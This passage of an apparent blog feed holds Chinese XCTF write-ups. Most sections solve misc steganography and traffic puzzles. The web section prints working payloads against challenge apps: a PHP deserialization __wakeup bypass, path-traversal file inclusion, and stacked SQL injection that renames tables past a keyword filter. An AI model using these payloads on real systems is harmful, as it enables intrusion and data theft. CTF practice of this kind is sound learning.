title="Hear-with-your-Eyes"></a>Hear-with-your-Eyes</h2><blockquote><p>知识点：频谱图</p></blockquote><p>使用Adobe家的<code>Audition</code>打开，查看频谱可以得到看到答案。</p><p><a href="https://imgchr.com/i/re0Izj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/13/re0Izj.png" alt="re0Izj.png"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc-进阶-0x03&quot;&gt;&lt;a href=&quot;#Misc-进阶-0x03&quot; class=&quot;headerlink&quot; title=&quot;Misc 进阶 0x03&quot;&gt;&lt;/a&gt;Misc 进阶 0x03&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;hit-the-core&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Misc 进阶 0x01+1</title>
    <link href="https://ensuperb.github.io/posts/XCTF-Misc-M-0x01/"/>
    <id>https://ensuperb.github.io/posts/XCTF-Misc-M-0x01/</id>
    <published>2020-12-08T12:32:33.000Z</published>
    <updated>2020-12-08T12:41:29.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc-进阶-0x01"><a href="#Misc-进阶-0x01" class="headerlink" title="Misc 进阶 0x01"></a>Misc 进阶 0x01</h1><hr><h2 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h2><p>wireshark过滤包为modbus，对modbus的数据流进行跟踪。找到flag。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVÀ)#|EYx7@@&lt;À¨À¨öó«##ùýÿpfPå<span class="number">9</span>+(sctf&#123;Easy_Mdbus&#125;</span><br></pre></td></tr></table></figure><p>提交时对<code>Modbus</code>字符串补全。</p><p>Refer：<a href="https://zh.m.wikipedia.org/zh-hans/Modbus" target="_blank" rel="noopener">Modbus  zh  wiki</a></p><h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something_in_image"></a>something_in_image</h2><p>直接使用Strings.exe工具扫描镜像内的可打印字符串。</p><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>将图片放入word或者PS进行水平垂直翻转各一次。</p><h2 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark-1"></a>wireshark-1</h2><p>过滤得http报文，跟踪user.php的http流，搜寻关键字<code>password</code>。</p><h2 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h2><p>在线的<a href="https://stegonline.georgeom.net/image" target="_blank" rel="noopener">stegonline</a>有时候确实香，不过真要更加细节的操作需要<a href="http://www.caesum.com/handbook/stego.htm" target="_blank" rel="noopener">Stegsolve</a>。便宜到Grey Bit可以见到清晰的FLAG。</p><h2 id="Aesop-secret"><a href="#Aesop-secret" class="headerlink" title="Aesop_secret"></a>Aesop_secret</h2><p>GIF放进photoshop，使所有图层可见，得到可见字符串<code>ISCC</code>。再放进十六进制查看器里，观察到文件尾部有疑似Base64的字符串，后了解到是AES密文，放入这个<a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">网站</a>连续解密两次。</p><hr><h1 id="Misc-进阶-0x02"><a href="#Misc-进阶-0x02" class="headerlink" title="Misc 进阶 0x02"></a>Misc 进阶 0x02</h1><hr><h2 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h2><p>此题有不同解法。</p><p>以压缩包的方式打开<code>a_very_good_idea.jpg</code>文件，发现有两张图：<code>to.png</code> \ <code>to_do.png</code></p><p>开始我用盲水印工具无法解出。</p><blockquote><p><strong>方案一</strong></p><p>先导入<code>to.png</code></p><p>再使用stegsolve的<code>image combiner</code>导入<code>to_do.png</code>进行比较，偏移到<code>XOR</code>模式。导入PS把曝光拉到最高（+20）。</p></blockquote><blockquote><p><strong>方案二</strong></p><p>两张图丢进<code>beyond Compare</code>。</p></blockquote><blockquote><p><strong>方案三</strong></p><p>先导入<code>to_do.png</code></p><p>再使用stegsolve的<code>image combiner</code>导入<code>to.png</code>进行比较，偏移到<code>SUB</code>模式。</p></blockquote><blockquote><p><strong>方案四</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img1 = Image.open(<span class="string">"to.png"</span>)</span><br><span class="line">img2 = Image.open(<span class="string">"to_do.png"</span>)</span><br><span class="line">weight,height = img1.size<span class="comment"># 获取图片长宽</span></span><br><span class="line">p1 = img1.load()</span><br><span class="line">p2 = img2.load()</span><br><span class="line"></span><br><span class="line">new_img = Image.new(<span class="string">'RGB'</span>,(weight,height))</span><br><span class="line">p = new_img.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(weight):</span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> range(height):</span><br><span class="line">    <span class="comment"># 控制解释：对比两张图像素，不一样的像素输出为白色。</span></span><br><span class="line">     <span class="keyword">if</span> p1[i, j] != p2[i, j]:</span><br><span class="line">         p[i,j] = (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)</span><br><span class="line">new_img.show()</span><br></pre></td></tr></table></figure></blockquote><p>Refer:  <a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/introduction-zh/" target="_blank" rel="noopener">Introduction to Image Analysis – CTF-Wiki</a></p><h2 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training-Stegano-1"></a>Training-Stegano-1</h2><p>用十六进制软件打开，结束。</p><h2 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio"></a>can_has_stdio</h2><p><a href="https://en.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">Brainfuck</a>，前往<a href="https://sange.fi/esoteric/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">在线工具</a>得解。</p><table><thead><tr><th>符号</th><th></th></tr></thead><tbody><tr><td>&gt;</td><td>increment pointer / 指针加一</td></tr><tr><td>&lt;</td><td>decrement pointer / 指针减一</td></tr><tr><td>+</td><td>increment value at pointer / 指针指向的字节的值加一</td></tr><tr><td>-</td><td>decrement value at pointer / 指针指向的字节的值减一</td></tr><tr><td>[</td><td>begin loop (continues while value at pointer is non-zero) / 如果指针指向的单元值为零，向后跳转到对应的<code>]</code>指令的次一指令处</td></tr><tr><td>]</td><td>end loop / 如果指针指向的单元值不为零，向前跳转到对应的<code>[</code>指令的次一指令处</td></tr><tr><td>,</td><td>read one character from input into value at pointer / 输入内容到指针指向的单元（ASCII码）</td></tr><tr><td>.</td><td>print value at pointer to output as a character / 输出指针指向的单元内容（<a href="https://zh.wikipedia.org/wiki/ASCII码" target="_blank" rel="noopener">ASCII码</a>）</td></tr><tr><td>#</td><td>display debugging info (in debug mode)</td></tr><tr><td>Any other characters are ignored.</td><td>—-</td></tr></tbody></table><h2 id="Janos-the-Ripper"><a href="#Janos-the-Ripper" class="headerlink" title="János-the-Ripper"></a>János-the-Ripper</h2><p>没有ZIP伪加密，使用工具<code>ARCHPR</code>进行密钥找回。</p><h2 id="Test-flag-please-ignore"><a href="#Test-flag-please-ignore" class="headerlink" title="Test-flag-please-ignore"></a>Test-flag-please-ignore</h2><p>以为是md5，转念一想应该是Hex转ASCII。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">"666c61677b68656c6c6f5f776f726c647d"</span></span><br><span class="line">step = int(len(string)/<span class="number">2</span>)</span><br><span class="line">b_string = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,step):</span><br><span class="line">    tmp = chr(int(string[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    b_string += tmp</span><br><span class="line">print(b_string)</span><br></pre></td></tr></table></figure><h2 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What-is-this"></a>What-is-this</h2><p>这题看到有两张图第一直觉是盲水印，但是发现这两张图即使是表面上看起来也不是一样的，然后第二直觉是丢进PS里使用混合模式，出flag。</p><p>这道题实际上两张图片对应的像素是互补的，则我们可以使用脚本让他们点对点相加试试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">img1 = Image.open(<span class="string">"pic1.jpg"</span>)</span><br><span class="line">img2 = Image.open(<span class="string">"pic2.jpg"</span>)</span><br><span class="line">width, height = img1.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> img1.size == img2.size:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">            img1.putpixel((x,y), (img1.getpixel((x, y)) + img2.getpixel((x,y)) ))<span class="comment"># 对像素位的操作</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc-进阶-0x01&quot;&gt;&lt;a href=&quot;#Misc-进阶-0x01&quot; class=&quot;headerlink&quot; title=&quot;Misc 进阶 0x01&quot;&gt;&lt;/a&gt;Misc 进阶 0x01&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;神奇的Modbus&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Web 进阶 0x01</title>
    <link href="https://ensuperb.github.io/posts/XCTF-WEB-M-0x01/"/>
    <id>https://ensuperb.github.io/posts/XCTF-WEB-M-0x01/</id>
    <published>2020-10-02T11:00:00.000Z</published>
    <updated>2020-10-17T03:11:13.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><blockquote><p>CVE-2016-7124</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><p><code>__wakeup()</code>特性：<code>unserialize()</code>时会自动调用。</p><p>__wakeup()可以被绕过，漏洞版本为PHP5 &lt; 5.6.25或PHP7 &lt; 7.0.10。</p><p>漏洞描述：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</p><p>根据提示，可知code参数是可攻击层面入口。</p><p>根据题目构造Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$code = <span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($code);</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;  <span class="comment">//输出的原始结果</span></span><br><span class="line">&gt;&gt;&gt; O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;  <span class="comment">//修改后的结果</span></span><br></pre></td></tr></table></figure><p>最终Payload： ?code=O:4:”xctf”:3:{s:4:”flag”;s:3:”111”;}</p><h2 id="warmup-FROM-HCTF-2018"><a href="#warmup-FROM-HCTF-2018" class="headerlink" title="warmup FROM HCTF 2018"></a>warmup FROM HCTF 2018</h2><p>HCTF2018 的签到题。</p><p>审查元素得到source.php，进入之后得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>放入调试程序中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">$page = <span class="string">"source.php?file=../../../../../../../ffffllllaaaagggg"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">// 判断是否字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"0.you can't see it&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'1.'</span>.$page.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">// 是否在白名单</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'2.'</span>.$page.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(<span class="comment">// 截取第一个问号处前的字符串</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;<span class="comment">// 白名单检测</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'3.'</span>.$_page.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);<span class="comment">// url编码解码</span></span><br><span class="line">            $_page = mb_substr(<span class="comment">// 截取第一个问号处前的字符串</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="comment">// return true;</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'4.'</span>.$_page.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'5.'</span>.<span class="string">"you can't see it&lt;br&gt;"</span>;</span><br><span class="line">            <span class="comment">// return false;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'6.'</span>.$_page.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; you can't see it</span></span><br><span class="line"><span class="comment">// &gt;&gt;&gt; source.php%3ffile=../../../../../../../ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure><p>观测此字符串可以绕过。由此构造Payload: <code>source.php?file=source.php%3ffile=../../../../../../../ffffllllaaaagggg</code> 通过。</p><blockquote><p>疑惑：为什么<code>index.php?file=source.php?/../../../../ffffllllaaaagggg</code>和<code>index.php?file=source.php%253f/../../../../ffffllllaaaagggg</code>是可以通过的。</p></blockquote><h2 id="supersqli-FROM-强网杯-2019"><a href="#supersqli-FROM-强网杯-2019" class="headerlink" title="* supersqli FROM 强网杯 2019"></a>* supersqli FROM 强网杯 2019</h2><p>Github &amp; Docker： <code>https://github.com/glzjin/qwb_2019_supersqli.git</code></p><p>输入2，无反应。输入 1 确认，返回：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">7</span>) <span class="string">"hahahah"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入 <code>1&#39;</code> 返回：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">error</span> 1064 : You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MariaDB<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span>1<span class="string">''</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure><p>输入 <code>1&#39; union select schema_name from information_schema.schemata;</code> ，返回：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure><p>确定过滤了上述词。</p><p>使用堆叠注入。</p><p><code>1&#39;; show tables;#</code>  输出如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">16</span>) <span class="string">"1919810931114514"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"words"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询<code>1919810931114514</code>表的字段 <code>1&#39;; show columns from</code>1919810931114514`;</p><p> (数值为表名操作时要加反引号)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rray(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"flag"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"varchar(100)"</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">"NO"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="keyword">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询<code>words</code>表的字段 <code>1&#39;; show columns from words;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">"id"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">7</span>) <span class="string">"int(10)"</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">"NO"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="keyword">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"data"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"varchar(20)"</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">"NO"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="keyword">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，<code>words</code>表具有对应关系，推测是本题使用的默认表：传入的<code>inject</code>参数赋值给字段<code>id</code>，通过<code>id</code>查询对应的<code>data</code>值。</p><p>禁用列表为：<code>select|update|delete|drop|insert|where</code></p><p>没有禁用：<code>rename|alert</code></p><p>故而可以将words表偷梁换柱：将<code>words</code>更名为<code>words2</code>，将数字表更名为<code>words</code>，将原数字表的字段名flag改为id。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename tables &#96;words&#96; to &#96;words2&#96;;</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; </span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(99);#</span><br></pre></td></tr></table></figure><p>由于不知道flag具体值（当然不知道啊），使用<code>1&#39; or 1=1</code>确保判断条件为真，得到flag。</p><h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span 